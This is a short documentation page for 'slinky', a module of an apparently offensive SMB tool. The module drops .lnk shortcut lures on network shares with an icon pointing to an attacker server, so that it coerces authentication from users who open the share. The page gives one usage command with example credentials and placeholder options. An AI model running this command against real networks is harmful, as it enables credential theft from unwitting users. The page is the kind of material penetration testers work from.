# slinky

Drops .lnk coercion lures with attacker icon (NAME=..., SERVER=..., SHARES=..., CLEANUP=True)

Options: `CLEANUP=...`, `IGNORE=...`, `NAME=...`, `SERVER=...`, `SHARES=...`

```bash
atlas smb 192.168.1.5 -u admin -p 'Password1!' -M slinky -o CLEANUP=...,IGNORE=...,NAME=...,SERVER=...,SHARES=...
```

Via Titanis (`SmbSlinkyModule.cs`).
